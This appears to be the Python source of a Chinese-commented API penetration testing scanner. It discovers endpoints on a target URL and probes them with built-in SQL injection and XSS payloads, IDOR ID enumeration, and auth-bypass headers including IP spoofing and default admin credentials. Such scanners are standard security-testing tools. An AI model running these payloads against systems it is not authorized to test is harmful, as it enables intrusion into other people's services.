#!/usr/bin/env python3
"""
API Tester - API渗透测试执行器

功能:
- HTTP请求发送
- 端点发现
- 漏洞检测
- 响应分析
"""

import re
import time
import json
import hashlib
from typing import Dict, List, Set, Optional, Any, Callable
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse, parse_qs
from enum import Enum
import logging

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


class VulnerabilitySeverity(Enum):
    """漏洞严重程度"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnerabilityType(Enum):
    """漏洞类型"""
    SQLI = "sqli"
    XSS = "xss"
    RCE = "rce"
    IDOR = "idor"
    SSRF = "ssrf"
    AUTH_BYPASS = "auth_bypass"
    RATE_LIMIT = "rate_limit"
    INFORMATION_DISCLOSURE = "info_disclosure"


@dataclass
class TestEndpoint:
    """测试端点"""
    path: str
    method: str = "GET"
    params: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    source: str = "unknown"


@dataclass
class Vulnerability:
    """漏洞"""
    type: VulnerabilityType
    severity: VulnerabilitySeverity
    endpoint: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    confidence: float = 0.0

    def to_dict(self) -> Dict:
        return {
            'type': self.type.value,
            'severity': self.severity.value,
            'endpoint': self.endpoint,
            'parameter': self.parameter,
            'payload': self.payload,
            'evidence': self.evidence,
            'confidence': self.confidence
        }


@dataclass
class TestResult:
    """测试结果"""
    endpoint: str
    method: str
    status_code: int
    response_time: float
    content_length: int
    content_hash: str
    headers: Dict[str, str]
    is_alive: bool = True
    error: Optional[str] = None


class ResponseAnalyzer:
    """响应分析器"""

    SQLI_ERRORS = [
        r"SQL syntax",
        r"MySQL",
        r"PostgreSQL",
        r"ORA-\d{5}",
        r"SQLite",
        r"JDBC",
        r"sqlalchemy",
    ]

    XSS_PATTERNS = [
        r"<script",
        r"javascript:",
        r"onerror=",
        r"onload=",
    ]

    def __init__(self):
        self.last_response_hash = ""

    def analyze_response(self, content: str, status_code: int) -> Dict[str, Any]:
        """分析响应内容"""
        result = {
            'has_sql_error': False,
            'has_xss_reflection': False,
            'has_stack_trace': False,
            'has_internal_ips': False,
            'content_hash': hashlib.md5(content[:1000].encode()).hexdigest()
        }

        content_lower = content.lower()

        for pattern in self.SQLI_ERRORS:
            if re.search(pattern, content, re.IGNORECASE):
                result['has_sql_error'] = True
                break

        if any(p in content_lower for p in ['<script', 'javascript:', 'onerror=']):
            result['has_xss_reflection'] = True

        if any(p in content_lower for p in ['stack trace', 'at ', '.java', '.py', 'traceback']):
            result['has_stack_trace'] = True

        ip_pattern = r'\b(10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)\b'
        if re.search(ip_pattern, content):
            result['has_internal_ips'] = True

        return result

    def check_sql_injection(self, original: str, modified: str, response: Dict) -> bool:
        """检查SQL注入"""
        if response.get('has_sql_error'):
            return True

        if len(response.get('content', '')) != len(original):
            if 'sql' in original.lower():
                return True

        return False

    def check_xss(self, payload: str, response: str) -> bool:
        """检查XSS"""
        if payload in response:
            return True
        return False


class APITester:
    """
    API 测试执行器

    功能：
    - 发送 HTTP 请求
    - 执行漏洞测试
    - 分析响应内容
    - 生成测试报告
    """

    def __init__(self, target: str, session: 'requests.Session' = None):
        self.target = target.rstrip('/')
        self.session = session or (requests.Session() if HAS_REQUESTS else None)

        if self.session:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (compatible; SecurityTestingBot/1.0)'
            })

        self.analyzer = ResponseAnalyzer()
        self.discovered_endpoints: List[TestEndpoint] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.test_results: List[TestResult] = []

    def add_endpoint(self, endpoint: TestEndpoint):
        """添加端点"""
        self.discovered_endpoints.append(endpoint)

    def discover_endpoints(self, paths: List[str] = None) -> List[str]:
        """
        发现 API 端点

        Args:
            paths: 常见 API 路径列表

        Returns:
            发现的端点列表
        """
        if paths is None:
            paths = [
                '/api', '/api/v1', '/api/v2', '/api/v3',
                '/rest', '/rest/api', '/graphql', '/api-docs',
                '/swagger', '/swagger.json', '/openapi.json',
                '/admin', '/login', '/auth', '/user', '/users',
                '/product', '/products', '/order', '/orders',
            ]

        discovered = []

        for path in paths:
            url = urljoin(self.target, path)
            try:
                resp = self.session.get(url, timeout=10, allow_redirects=True)
                if resp.status_code < 500:
                    discovered.append(path)
                    self.discovered_endpoints.append(TestEndpoint(
                        path=path,
                        method='GET',
                        source='discovery'
                    ))
            except Exception as e:
                logger.debug(f"Discovery failed for {path}: {e}")

        return discovered

    def test_sqli(self, endpoint: TestEndpoint, payloads: List[str] = None) -> List[Vulnerability]:
        """
        测试 SQL 注入

        Args:
            endpoint: 测试端点
            payloads: SQL注入 payload 列表

        Returns:
            发现的漏洞列表
        """
        if payloads is None:
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin'--",
                "1' AND '1'='1",
                "1' ORDER BY 1--",
                "1' UNION SELECT NULL--",
            ]

        vulnerabilities = []
        original_resp = None

        try:
            original_resp = self.session.request(
                endpoint.method,
                urljoin(self.target, endpoint.path),
                params=endpoint.params,
                headers=endpoint.headers,
                data=endpoint.body,
                timeout=10
            )
            original_content = original_resp.text
        except Exception as e:
            logger.debug(f"Original request failed: {e}")
            return vulnerabilities

        for param in endpoint.params:
            for payload in payloads:
                test_params = endpoint.params.copy()
                test_params[param] = payload

                try:
                    resp = self.session.request(
                        endpoint.method,
                        urljoin(self.target, endpoint.path),
                        params=test_params if endpoint.method == 'GET' else None,
                        headers=endpoint.headers,
                        data=test_params if endpoint.method in ['POST', 'PUT', 'PATCH'] else None,
                        timeout=10
                    )

                    analysis = self.analyzer.analyze_response(resp.text, resp.status_code)

                    if analysis['has_sql_error']:
                        vulnerabilities.append(Vulnerability(
                            type=VulnerabilityType.SQLI,
                            severity=VulnerabilitySeverity.HIGH,
                            endpoint=endpoint.path,
                            parameter=param,
                            payload=payload,
                            evidence=f"SQL error detected in response",
                            confidence=0.9
                        ))
                        break

                except Exception as e:
                    logger.debug(f"SQLi test failed for {param}={payload}: {e}")

        return vulnerabilities

    def test_xss(self, endpoint: TestEndpoint, payloads: List[str] = None) -> List[Vulnerability]:
        """
        测试 XSS

        Args:
            endpoint: 测试端点
            payloads: XSS payload 列表

        Returns:
            发现的漏洞列表
        """
        if payloads is None:
            payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
            ]

        vulnerabilities = []

        for param in endpoint.params:
            for payload in payloads:
                test_params = endpoint.params.copy()
                test_params[param] = payload

                try:
                    resp = self.session.request(
                        endpoint.method,
                        urljoin(self.target, endpoint.path),
                        params=test_params if endpoint.method == 'GET' else None,
                        headers=endpoint.headers,
                        data=test_params if endpoint.method in ['POST', 'PUT', 'PATCH'] else None,
                        timeout=10
                    )

                    if payload in resp.text:
                        vulnerabilities.append(Vulnerability(
                            type=VulnerabilityType.XSS,
                            severity=VulnerabilitySeverity.HIGH,
                            endpoint=endpoint.path,
                            parameter=param,
                            payload=payload,
                            evidence="Payload reflected in response",
                            confidence=0.85
                        ))
                        break

                except Exception as e:
                    logger.debug(f"XSS test failed for {param}={payload}: {e}")

        return vulnerabilities

    def test_idor(self, endpoint: TestEndpoint, test_ids: List[Any] = None) -> List[Vulnerability]:
        """
        测试 IDOR

        Args:
            endpoint: 测试端点
            test_ids: 用于测试的 ID 列表

        Returns:
            发现的漏洞列表
        """
        if test_ids is None:
            test_ids = [1, 2, 3, 100, 1000, 'admin', 'root']

        vulnerabilities = []

        for param in endpoint.params:
            for test_id in test_ids:
                test_params = endpoint.params.copy()
                test_params[param] = str(test_id)

                try:
                    resp = self.session.request(
                        endpoint.method,
                        urljoin(self.target, endpoint.path),
                        params=test_params if endpoint.method == 'GET' else None,
                        headers=endpoint.headers,
                        data=test_params if endpoint.method in ['POST', 'PUT', 'PATCH'] else None,
                        timeout=10
                    )

                    if resp.status_code == 200 and len(resp.text) > 0:
                        try:
                            resp_json = resp.json()
                            if isinstance(resp_json, dict) and 'id' in resp_json:
                                vulnerabilities.append(Vulnerability(
                                    type=VulnerabilityType.IDOR,
                                    severity=VulnerabilitySeverity.MEDIUM,
                                    endpoint=endpoint.path,
                                    parameter=param,
                                    payload=str(test_id),
                                    evidence=f"Direct access to resource ID {test_id}",
                                    confidence=0.7
                                ))
                        except:
                            pass

                except Exception as e:
                    logger.debug(f"IDOR test failed: {e}")

        return vulnerabilities

    def test_auth_bypass(self, endpoint: TestEndpoint) -> List[Vulnerability]:
        """
        测试认证绕过

        Args:
            endpoint: 测试端点

        Returns:
            发现的漏洞列表
        """
        vulnerabilities = []

        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': '10.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Api-Version': '1.0'},
            {'Authorization': 'Bearer '},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},
        ]

        for headers in bypass_headers:
            try:
                resp = self.session.request(
                    endpoint.method,
                    urljoin(self.target, endpoint.path),
                    headers={**endpoint.headers, **headers},
                    timeout=10
                )

                if resp.status_code == 200 and len(resp.text) > 0:
                    vulnerabilities.append(Vulnerability(
                        type=VulnerabilityType.AUTH_BYPASS,
                        severity=VulnerabilitySeverity.HIGH,
                        endpoint=endpoint.path,
                        payload=str(headers),
                        evidence=f"Possible auth bypass with headers: {list(headers.keys())}",
                        confidence=0.6
                    ))

            except Exception as e:
                logger.debug(f"Auth bypass test failed: {e}")

        return vulnerabilities

    def run_tests(self, test_types: List[str] = None) -> Dict:
        """
        运行所有测试

        Args:
            test_types: 要运行的测试类型 ['sqli', 'xss', 'idor', 'auth']

        Returns:
            测试结果
        """
        if test_types is None:
            test_types = ['sqli', 'xss', 'idor', 'auth']

        results = {
            'endpoints_tested': 0,
            'tests_passed': 0,
            'vulnerabilities_found': 0,
            'vulnerabilities': []
        }

        for endpoint in self.discovered_endpoints:
            results['endpoints_tested'] += 1

            if 'sqli' in test_types:
                vulns = self.test_sqli(endpoint)
                self.vulnerabilities.extend(vulns)
                results['vulnerabilities'].extend([v.to_dict() for v in vulns])

            if 'xss' in test_types:
                vulns = self.test_xss(endpoint)
                self.vulnerabilities.extend(vulns)
                results['vulnerabilities'].extend([v.to_dict() for v in vulns])

            if 'idor' in test_types:
                vulns = self.test_idor(endpoint)
                self.vulnerabilities.extend(vulns)
                results['vulnerabilities'].extend([v.to_dict() for v in vulns])

            if 'auth' in test_types:
                vulns = self.test_auth_bypass(endpoint)
                self.vulnerabilities.extend(vulns)
                results['vulnerabilities'].extend([v.to_dict() for v in vulns])

        results['vulnerabilities_found'] = len(self.vulnerabilities)
        return results

    def get_vulnerabilities_by_severity(self) -> Dict[str, List[Vulnerability]]:
        """按严重程度分组漏洞"""
        grouped = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': [],
            'info': []
        }

        for vuln in self.vulnerabilities:
            grouped[vuln.severity.value].append(vuln)

        return grouped


def create_api_tester(target: str, session: 'requests.Session' = None) -> APITester:
    """创建 API 测试器"""
    return APITester(target, session)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python api_tester.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    tester = create_api_tester(target)

    print(f"[*] Discovering endpoints...")
    endpoints = tester.discover_endpoints()
    print(f"[+] Found {len(endpoints)} endpoints")

    print(f"[*] Running tests...")
    results = tester.run_tests(['sqli', 'xss'])
    print(f"[+] Found {results['vulnerabilities_found']} vulnerabilities")

    for vuln in tester.vulnerabilities:
        print(f"  [{vuln.severity.value.upper()}] {vuln.type.value}: {vuln.endpoint}")
